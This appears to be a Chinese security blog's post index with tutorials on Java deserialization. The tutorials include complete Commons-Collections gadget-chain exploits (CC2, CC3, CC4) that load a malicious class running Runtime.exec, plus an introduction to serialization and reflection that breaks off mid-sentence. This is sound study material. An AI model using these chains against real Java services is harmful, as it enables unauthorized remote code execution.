[{"title":"CommonsCollections 2+4+5+7","url":"/2023/05/30/CommonsCollections-2-4-5-7/","content":"CommonsCollections 2+4+5+7CommonsCollections 4我们在之前的CC3中是通过动态类加载初始化一个类，从而执行类中构造的恶意代码，CC4和CC3的最终代码执行位置都是相同的，不过前面的构造过程可能会有一些差别。\nCC4这条链用了CommonsCollections4这个依赖中的一些属性，我们先从ChainedTransformer.transform入手，往回找其他的利用点：\n\n我们在CC4的comprators包下找到了TransformingComprator.compare这个public方法，并且TransformingComprator这个类是可序列化的：\n\n我们再往下找谁调用了TransformingComprator.compare，最后在java原生util包下找到了PriorityQueue（优先队列）中的siftDownUsingComparator方法：\n\n并且就在这个方法的上面，siftdown方法调用了siftDownUsingComparator方法，所以接着找哪里调用了siftdown.\n\n还是在优先队列这个类中，heapify方法调用了siftdown，这里要注意想要成功调用siftDown，就要让size进行右移运算后-1 &gt;= 0，所以这里size至少要为2：\n\n在往下找，找到CC4的终点，在优先队列的readObject方法中调用了heapify：\n\n可以发现CC4与CC3唯一在CommonsCollections中依赖的不同就是在TransformingComprator这个类中，因为优先队列是java中自带的一个工具类，而之所以这条利用链在CC3中用不了是因为CC3包中这个类不能反序列化，而在CC4包中，这个类却继承了Serializable，所以在CC4中就可以使用这条链进行攻击了\nCC3:\n\nCC4:\n\n正向构造利用链：\npackage ysoserial.payloads.util.Test.util;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import javax.xml.transform.Templates;import java.io.IOException;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;import static ysoserial.payloads.util.Test.util.Serialize.serialize;import static ysoserial.payloads.util.Test.util.Unserialize.unserialize;public class CC4Test {    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] code  = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/web安全/Java安全/ysoserial-master/target/classes/ysoserial/payloads/util/Test/Calc.class\"));        byte[][] codes = new byte[][]{code};        Class tem = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");        Field bytecodes = tem.getDeclaredField(\"_bytecodes\");        bytecodes.setAccessible(true);        bytecodes.set(templatesimpl,codes);        Field name = tem.getDeclaredField(\"_name\");        name.setAccessible(true);        name.set(templatesimpl,\"aaa\");        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});        Transformer[] transformers = new Transformer[]{            new ConstantTransformer(TrAXFilter.class),            instantiateTransformer        };        ChainedTransformer ctf = new ChainedTransformer(transformers);        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(123));        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);        priorityQueue.add(1);        priorityQueue.add(2);        Field transformingComparatorFiled = transformingComparator.getClass().getDeclaredField(\"transformer\");        transformingComparatorFiled.setAccessible(true);        transformingComparatorFiled.set(transformingComparator,ctf);        serialize(priorityQueue);        unserialize(\"ser.bin\");    }}\n\n​    \nCommonsCollections 2CC2这条链和CC4不同的是在加载恶意类后，会通过调用TemplatesImpl.newTransformer从而初始化恶意类，执行代码，在CC4链中，我们可以通过调用TraxFilter然后再往前接着找利用连，而CC2则是在这里通过直接调用InvokerTransformer.transform直接调用TemplatesImpl.newTransformer:\n\n构造链如下：\npackage ysoserial.payloads.util.Test;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;import static ysoserial.payloads.util.Test.util.Serialize.serialize;import static ysoserial.payloads.util.Test.util.Unserialize.unserialize;public class CC2Test {    public static void main(String[] args) throws Exception{        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] code  = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/web安全/Java安全/ysoserial-master/target/classes/ysoserial/payloads/util/Test/Calc.class\"));        byte[][] codes = new byte[][]{code};        Class tem = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");        Field bytecodes = tem.getDeclaredField(\"_bytecodes\");        bytecodes.setAccessible(true);        bytecodes.set(templatesimpl,codes);        Field name = tem.getDeclaredField(\"_name\");        name.setAccessible(true);        name.set(templatesimpl,\"aaa\");        InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\",new Class[]{},new Object[]{});        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(123));        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);        priorityQueue.add(templatesimpl);        priorityQueue.add(2);        Field transformingComparatorFiled = transformingComparator.getClass().getDeclaredField(\"transformer\");        transformingComparatorFiled.setAccessible(true);        transformingComparatorFiled.set(transformingComparator,invokerTransformer);        serialize(priorityQueue);        unserialize(\"ser.bin\");    }}\n\n\n\nCommonsCollections 5 &amp;&amp; CommonsCollections 7这两条链子就和CC1、6的方式一样了，都是通过调用Runtime.exec来命令执行，不过调用readObject的入口点不一样了，具体如下：\nCC5:\nBadAttributeValueExpException.readObject –&gt;  TiedMapEntry.toString  –&gt;  LazyMap.get，后续则和CC1一样\nCC7:\nHashTable.readObject  –&gt;  AbstractMap.equals –&gt; LazyMay.get，后续和CC1一样\n所有调用链的调用过程：\n","categories":["WebSec"],"tags":["Java反序列化"]},{"title":"CommonsCollections3","url":"/2023/05/20/CommonsCollections3/","content":"CC1打不通时的另外一条链CC3在CC1和CC6中，我们最终弹计算器都是通过Runtime.exec进行调用，从CC3我们要介绍一种不通过Runtime来弹计算器的方法，也就是Java中常提到的动态类加载，动态类加载可以让我们通过一个路径来加载一个恶意类，如果这个恶意类在静态代码块或构造代码块中写入了恶意方法，那么我们就可以通过找一条链子来初始化这个类（一般在进行实例化时会对类进行初始化），从而达到代码块中的代码执行。\nClassLoader中的defineClass最终实现了类的动态加载（后面还有一些过程但已经是依靠c来实现的了），在ClassLoader中可以看到一堆defineClass，我们查找用法，看一下哪个defineClass在别处被调用了，而且权限最好是default或者public，方便我们利用，最终锁定下面这个：\nprotected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)        throws ClassFormatError\n\n这个defineClass被调用的点在com.sun.org.apache.xalan.internal.xsltc.trax中的TemplatesImpl.TransletClassLoader下，也是一个defineClass：\n\n这个defineClass又在当前类中被defineTransletClasses调用：\n\ndefineTransletClasses同类下有三个被调用点，我们看一下哪个方法可以被我们利用：\n\n第一个返回_class：\nprivate synchronized Class[] getTransletClasses() {        try {            if (_class == null) defineTransletClasses();        }        catch (TransformerConfigurationException e) {            // Falls through        }        return _class;    }\n\n第二个返回了_class的下标：\npublic synchronized int getTransletIndex() {        try {            if (_class == null) defineTransletClasses();        }        catch (TransformerConfigurationException e) {            // Falls through        }        return _transletIndex;    }\n\n第三个方法我们主要看newInstance这里，这个_class[_transletIndex]可控（通过上面找到的defineTransletClasses动态加载进来），如果我们让_class为我们所构造的恶意类并让它newInstance，那么就可以执行恶意类中的静态/构造代码块中的代码，所以我们接着找这个方法的调用点：\nprivate Translet getTransletInstance()        throws TransformerConfigurationException {        try {            if (_name == null) return null;            if (_class == null) defineTransletClasses();            // The translet needs to keep a reference to all its auxiliary            // class to prevent the GC from collecting them            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();\n\n下一调用点还是在这个类中，我们找到newTransformer()这个方法：\npublic synchronized Transformer newTransformer()        throws TransformerConfigurationException    {        TransformerImpl transformer;        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,            _indentNumber, _tfactory);\n\n我们来梳理一下到目前的调用链，很短也很方便：\n\n我们先将payload写出来：\nTemplatesImpl templatesimpl = new TemplatesImpl();        templatesimpl.newTransformer();\n\n写完啦 下班！（开个玩笑）逻辑上来说这两行代码确实是完整的调用链，我们接下来要做的就是对类内部的各种属性进行赋值：\nnewTransformer内不需要进行赋值操作，跟进到getTransletInstance中 ，类内没有对_name和_class进行赋值，如果想要触发defineTransletClasses()我们就需要让_name不为空，_class为空，直接不给_class赋值即可：\nif (_name == null) return null;if (_class == null) defineTransletClasses();\n\n继续跟进到defineTransletClasses中 ，如果想要走到下面动态加载_class，我们这里要注意对_tfactory进行赋值，否则对一个空属性调用方法，会爆空指针异常：\nreturn new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());\n\n上一步之后我们在对_class赋值这里可以看到是通过修改_bytecodes从而控制_class的值：\nfor (int i = 0; i &lt; classCount; i++) {                _class[i] = loader.defineClass(_bytecodes[i]);\n\n一共三个需要修改的值，TemplatesImpl类是可序列化的，所以我们可以直接通过反射修改这些值，看一下这几个值的类型:\nprivate String _name = null;private byte[][] _bytecodes = null;private transient TransformerFactoryImpl _tfactory = null;\n\n都是private属性，所以要用setAccessible 来修改访问权限，name是String类型，所以直接赋个字符串就行：\nClass tmp = templatesimpl.getClass();    Field nameField = tmp.getDeclaredField(\"_name\");    nameField.setAccessible(true);    nameField.set(templatesimpl,\"y1\");\n\n再看_bytecodes，一个二维数组，但我们在给_class赋值时defineClass接受的却是一个一维数组：\nfor (int i = 0; i &lt; classCount; i++) {                _class[i] = loader.defineClass(_bytecodes[i]);Class defineClass(final byte[] b) {            return defineClass(null, b, 0, b.length);\n\n所以我们给_bytecodes 赋值时可以将defineClass接收的一维数组放进_bytecodes这个二维数组中，这样在进行for循环遍历时就可以将这个一维数组遍历出来并传给defineClass，这个class需要我们在写好java源码后手动编译为class文件，最好把这个class文件复制到电脑上的别的地方再在这里使用（编译后的class文件一般在target下）：\nField bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);\n\nTest.classpublic class Calc {    static{        try {            Runtime.getRuntime().exec(\"open -na Calculator\"); //这里是mac弹计算器的命令        } catch (IOException e) {                             //win下还是calc            throw new RuntimeException(e);        }    }}\n\n然后我们再来改_tfactory的值：\n这里要注意一下，被transient关键字修饰的属性是不参与序列化的，也就是说就算我们通过反射修改了它的值，反序列化后的二进制流这个属性的值也依旧是null，所以这里我们要用其他的方式赋值\nprivate transient TransformerFactoryImpl _tfactory = null;\n\n我们在readObject中发现有对这些属性进行赋值的操作，_tfactory的值是一个TransformerFactoryImpl实例：\n_name = (String)gf.get(\"_name\", null);   //以下几行代码对序列化流中的属性读取它们的值，如果读不到值那么将它的值设为默认值（第二个参数）    \t\t\t  _bytecodes = (byte[][])gf.get(\"_bytecodes\", null);        _class = (Class[])gf.get(\"_class\", null);        _transletIndex = gf.get(\"_transletIndex\", -1);        _outputProperties = (Properties)gf.get(\"_outputProperties\", null);        _indentNumber = gf.get(\"_indentNumber\", 0);        if (is.readBoolean()) {            _uriResolver = (URIResolver) is.readObject();        }        _tfactory = new TransformerFactoryImpl();    }\n\n我们先不进行序列化和反序列化，我们先用反射修改_tfactory的值，看看能不能弹计算器（这里我们并没有进行序列化和反序列化，所以其实就是用反射修改了个值，所以是可以修改成功的）：\nTemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        templatesimpl.newTransformer();\n\n没有弹出来计算器，爆了空指针异常，通过调试发现在_class成功加载类后，是这里抛出了异常：\nfinal Class superClass = _class[i].getSuperclass();if (superClass.getName().equals(ABSTRACT_TRANSLET)) {                    _transletIndex = i;                }                else {                    _auxClasses.put(_class[i].getName(), _class[i]);                }            }            if (_transletIndex &lt; 0) {                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);                throw new TransformerConfigurationException(err.toString());            }\n\n第一个if检查_class的父类是否叫ABSTRACT_TRANSLET ，如果没有进入到if里面那么else中的_auxClasses为空，就会抛空指针，并且下面第二个if中也会抛异常，为了避免这两个抛异常的点，我们需要将_class加载的恶意类继承名为ABSTRACT_TRANSLET 的父类：\nprivate static String ABSTRACT_TRANSLET        = \"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\";\n\n修改恶意类，继承的父类中有两个抽象方法需要进行重写：\npublic class Calc extends AbstractTranslet{    static{        try {            Runtime.getRuntime().exec(\"open -na Calculator\");        } catch (IOException e) {            throw new RuntimeException(e);        }    }    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    }    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {            }}\n\n现在就可以弹出计算器了，如果你这里没有弹出来，看一下import的包是不是有问题，TemplatesImpl和TransformerFactoryImpl的路径一定要是com.xxx，如果是org.xxx是不能用的：\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;public class CC3Test {    public static void main(String[] args) throws Exception{        TemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        templatesimpl.newTransformer();    }}\n\n下面我们要想办法执行templatesimpl.newTransformer，这里依旧是用CC1中用到的InvokerTransformer.transform进行代码的执行：\nTemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{            new ConstantTransformer(templatesimpl),            new InvokerTransformer(\"newTransformer\",null,null)        });        ctf.transform(1);\n\n剩下的找Chainedtransformer.transform 的调用点就和CC1后面一样了，直接粘过来就是：\npackage ysoserial.payloads.Test;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;import static ysoserial.payloads.util.Test.util.Serialize.serialize;import static ysoserial.payloads.util.Test.util.Unserialize.unserialize;public class CC3Test {    public static void main(String[] args) throws Exception{        TemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{            new ConstantTransformer(templatesimpl),            new InvokerTransformer(\"newTransformer\",null,null)        });        HashMap map = new HashMap();        map.put(\"value\",\"v\");        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,ctf);        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlerconstructor.setAccessible(true);        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);        serialize(o);        unserialize(\"ser.bin\");    }}\n\n相较于CC1来说一个是通过调用Runtime来进行命令执行，一个是通过动态类加载进行代码执行，如果过滤了Runtime我们就可以尝试用这条CC3\n接下来我们在来说ysoserial上用的另一条调用链：\n我们回到newTransformer，刚才说的是用CC1后半段直接调用，我们接着向下找调用newTransformer 的地方，最终锁定在了com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java 这个类上，这个类没有继承serialize接口，也就是说我们没办法通过反射来修改实例中属性的值，但是我们想到对属性值进行初始化的操作一般在构造函数中，我们来看一下它的构造函数：\npublic TrAXFilter(Templates templates)  throws        TransformerConfigurationException    {        _templates = templates;        _transformer = (TransformerImpl) templates.newTransformer();        _transformerHandler = new TransformerHandlerImpl(_transformer);        _useServicesMechanism = _transformer.useServicesMechnism();    }\n\n我们可以通过这个构造函数来控制这个templates的值，所以下一步就是要找可以调用这个构造函数的地方，ysoserial中给出了InstantiateTransformer 这个类，通过它的构造函数和transform方法可以调用一个对象的指定参数的构造函数：\n public InstantiateTransformer(Class[] paramTypes, Object[] args) {        this.iParamTypes = paramTypes;        this.iArgs = args;    }public Object transform(Object input) {        try {            if (!(input instanceof Class)) {                throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName()));            } else {                Constructor con = ((Class)input).getConstructor(this.iParamTypes);                return con.newInstance(this.iArgs);            }\n\n也就是说下面两行代码就可以执行newTransformer了：\nInstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});instantiateTransformer.transform(TrAXFilter.class);\n\n最终还是用ChainedTransformer包裹起来执行：\nTemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{            new ConstantTransformer(TrAXFilter.class),            instantiateTransformer        });        HashMap map = new HashMap();        map.put(\"value\",\"v\");        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,ctf);        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlerconstructor.setAccessible(true);        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);        serialize(o);        unserialize(\"ser.bin\");\n\n完整的CC6调用链，当InvokerTransformer被ban时就可以用这条链：\n\n","categories":["WebSec"],"tags":["Java反序列化"]},{"title":"Java安全反序列化预备全知","url":"/2023/04/21/Java%E5%AE%89%E5%85%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%84%E5%A4%87%E5%85%A8%E7%9F%A5/","content":"Java原生序列化/反序列化Java反序列化入门篇Java IO在学习Java反序列化之前我们先要了解一下Java的输入输出流：\njava的IO流分为了文件IO流（FileInput/OutputStream）和对象IO流（ObjectInput/OutputStream），从名字上就可以看出来一个是用来对文件进行输入和输出，一个是对对象进行输入和输出。\n流的传输过程：\n首先不管是输入还是输出，传输的两端都是文件和java的运行程序，所以如果想要在这二者之间进行传输，我们就需要将他们两个之间搭起来一个可以传输的通道，这样就可以实现流的传输。\n\n输出流（OutputStream）：\n\n如果我们想对一个文件进行写入操作，那么实质上是在java程序中将流（想要写入的内容）输出到目的文件中，所以流的方向是从java输出到文件，举个对文件写入一个对象的例子：\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"filename\"));oos.writeObject(obj);\n\n首先用new FileOutputStream创建一个文件输出流，再用new ObjectOutputStream创建一个对象输出流（因为oos是对象输出流类型），这时我们就可以在java程序中向外（文件）输出流（内容）了，画成图大概是这样：\n\n当我们要给这个文件传一个obj对象时，就会从java程序顺着这条通道进入到file中。\n\n输入流（InputStream）\n\n其实输入流和输出流构建出传输通道的方法几乎是一样的，区别就是流的输出方向是从file指向了java程序，所以如果想要read这个文件我们就要用输入流将file输入到java程序中进行读取。\nJava序列化和反序列化的过程首先为什么要进行序列化和反序列化，在程序运行结束后，这个程序里的对象都会被删除，并且对象的构成很复杂，传输起来非常不方便。如果我们想要让某些对象持久的保存下来并利于传输，我们就可以将这些对象进行序列化成一串数据，保存在某个地方，在需要用到这个对象时再反序列化让这一串数据还原成一个对象。看到一个很生动的比喻，想把一张桌子搬进门里，如果不能通过，我们就可以将这个桌子拆开（序列化），在搬进去之后再将桌子组装回去（序列化），这就是序列化和反序列化。\n与php反序列化不同的是php序列化和反序列化提供了关键字serialize和unserialize，但java并没有这种api，我们刚才提到了Java的IO，那么它和Java的序列化和反序列化之间有什么关系呢，我们刚才说序列化就是将对象转换为一串字节数据并保存起来，那么这个过程的实现其实就是依靠java的输出，将这个对象从java程序里以字节数据流的形式输出到java的外部，相对的反序列化其实就是依靠java的输入，将java外的字节数据流输入到java程序中，最终经过一些处理还原为对象。也就是说java中的序列化和反序列化是需要开发人员自己写出整个过程。这里提供两段使用javaIO进行序列化和反序列化的代码（如果要完成整个序列化和反序列化的过程，还需要其他方法参与构建，如readObject和writeObject，下面会提到），假设ser.bin是我们用来储存序列化后字节数据流的文件：\n/** 要序列化和反序列化的类 **/import java.io.Serializable;public class Person implements Serializable {    private String name;    private int age;    public Person(){    }    // 构造函数    public Person(String name, int age){        this.name = name;        this.age = age;    }    @Override    public String toString(){        return \"Person{\" +                \"name='\" + name + '\\\\'' +                \", age=\" + age +                '}';    }}\n\n/** 序列化 **/import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutput;import java.io.ObjectOutputStream;public class SerializationTest {    public static void serialize(Object obj) throws IOException{        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));        oos.writeObject(obj);    }    public static void main(String[] args) throws Exception{        Person person = new Person(\"aa\",22);        System.out.println(person);        serialize(person);    }}\n\n/** 反序列化 **/import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class UnserializeTest {    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    }    public static void main(String[] args) throws Exception{        Person person = (Person)unserialize(\"ser.bin\");        System.out.println(person);    }}\n\n输出后可以发现在序列化之前输出对象person和在反序列化后输出都调用了__toString，成功构造了序列化和反序列化。\nphp和Java反序列化之间的区别在php的序列化和反序列化中提供了serialize和unserialize函数，可以直接将对象序列化为一串数据或直接将一串数据反序列化为一个对象，程序员在这个过程中是无法参与的，但在Java中，需要程序员自己来构建序列化和反序列化的过程，php在反序列化时会自动触发__wakeup函数，java在反序列化时会自动触发readObject方法，虽然都是在反序列化时触发，但二者之间有一些细微的差别。\nphp反序列化（对一个数据库链接对象反序列化）：\n&lt;?phpclass Connection{    protected $link;    private $dsn, $username, $password;    public function __construct($dsn, $username, $password)    {        $this-&gt;dsn = dsn;        $this-&gt;username = username;        $this-&gt;password = password;        $this-&gt;connect();    }    private function connect()    {        $this-&gt;link = new PDO($this-&gt;dsn, $this-&gt;username, $this-&gt;password);    }}\n\n如果我们直接输出序列化后的这个Connection类的对象，发现输出为null，那么在反序列化时也是null，因为在php中资源类型的对象默认不会写入序列化数据中。\n如果我们将代码改成下面这样就可以在序列化后在$link中拿到一个数据库连接了：\n&lt;?phpclass Connection{    protected $link;    private $dsn, $username, $password;    public function __construct($dsn, $username, $password)    {        $this-&gt;dsn = dsn;        $this-&gt;username = username;        $this-&gt;password = password;        $this-&gt;connect();    }    private function connect()    {        $this-&gt;link = new PDO($this-&gt;dsn, $this-&gt;username, $this-&gt;password);    }    public function __sleep()    {            return array('dsn', 'username', 'password');    }    public function __wakeup()    {        $this-&gt;connect();    }}\n\nConnection的对象被反序列化后调用__wakeup，执行connect函数连接数据库，所以__wakeup的作用其实是反序列化后执行一些初始化操作，但在php中很少利用序列化数据传输资源类型的对象，而其他类型的对象在反序列化的时候已经把值写死了，所以php的反序列化漏洞中很少是由__wakeup这个方法触发的，通常触发在__destruct中。\nJava反序列化：\nimport java.io.IOException;import java.io.Serializable;public class Person implements Serializable {    private String name;    private int age;    Person(String name,int age)    {        this.name = name;        this.age = age;    }    private void writeObject(java.io.ObjectOutputStream s) throws IOException {        s.defaultWriteObject();        s.writeObject(\"This is a Object\");    }    private void writeObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {        s.defaultReadObject();        String message = (String) s.readObject();        System.out.println(message);    }}\n\n在writeObject中，当传入的对象完成了从ObjectOutputStream中继承来的defaultWriteObject后，向流内写入了一个”This is a Object”，因此会在序列化后触发改方法，将字符串写入输出流的对象中，用知识星球里提到的工具SerializationDumper可以看到这个字符串被写到了objectAnnotation位置，在反序列化还原对象时就会将这个字符串输出。\n\n反序列化的过程是根据开发者的想法来实现的，所以总结一下__wakeup和readObject的不同就是：readObject倾向于解决”反序列化时如何还原一个完整对象”这个问题，而PHP的__wakeup更倾向于解决反序列化后如何初始化这个对象的问题。\n反射+URLDNSJava反射篇如果我们有一个类，那么我们可以通过实例化该类的对象并调用其中的方法，或者我们也可以直接调用该类中的静态方法，这是我们在一般情况下调用一个方法时的过程，但是在不同的语言中也有不同的方法可以拿到某一个类中的所有内容，在java中我们可以通过“反射”来拿到某一个类中的具体内容 如果把通过new对象并且调用其中的方法的过程叫做“正射”，那么不使用new来创建对象并调用其中方法的过程就叫做“反射”\n反射常用到的方法在java的lang包中有一个静态Class类 在java程序运行并编译加载一个类时，java.lang.Class就会实例化出一个对象，这个对象储存该类的所有信息 因此我们可以通过一些方法来获取到这个类的信息 先了解一些方法\n\nClass.forName(classname) 获取classname类中的所有属性包括类名 比如Class clazz = Class.forName(\"java.lang.Runtime\");\n\n那么类clazz中就得到了java.lang.Runtime中的所有属性\n\nClass.newInstance()实例化对象，并触发该类的构造方法 下面会详细解释\nClass.getMethod(method name,arg) 获取一个对象中的public方法，由于java支持方法的重载，所以需要第二参数作为获取的方法的形参列表，这样就可以确定获取的是哪一个方法\nMethod.invoke() 执行方法，如果是一个普通方法，则invoke的第一个参数为该方法所在的对象，如果是静态方法则第一个参数是null或者该方法所在的类 第二个参数为要执行方法的参数\n\nforName并不是唯一获取一个类的方式，其他方式还有：\n\nobj.getClass() 如果上下文中存在某个类的实例obj，那我们可以直接通过obj.getClass来获取它的类\nY1.class 如果已经加载了一个类Y1，只是想获取到它由java.lang.class所创造的对象，那么就直接使用这种方法获取即可，这种方法并不属于反射\nClass.Forname 如果知道某个类的名字，想获取到这个类，就可以使用forName来获取\n\n关于forname默认情况下 forName的第一个参数是类名，第二个参数表示是否初始化，第三个参数就是ClassLoader\nClassLoader是一个“加载器”，告诉java虚拟机如何加载这个类，java默认的ClassLoader就是根据类名加载类，这个类名必须是完整路径，比如上面提到的java.lang.Runtime\n第二个参数initialize用于forname时的初始化，一般我们会认为初始化就是加载类的构造函数，其实并不是，这里提到的初始化有以下过程：\n看下面这个类：\nclass TrainPrint{    {        System.out.printf(\"Empty block inittial &amp;s\\\\n\", this.getClass());    }    static{        System.out.printf(\"Static initial %s\\\\n\", TrainPrint.class);    }    public TrainPrint(){        System.out.printf(\"Innitial %s\\\\n\", this.getClass());    }}\n\n这个类中一共有三个代码块 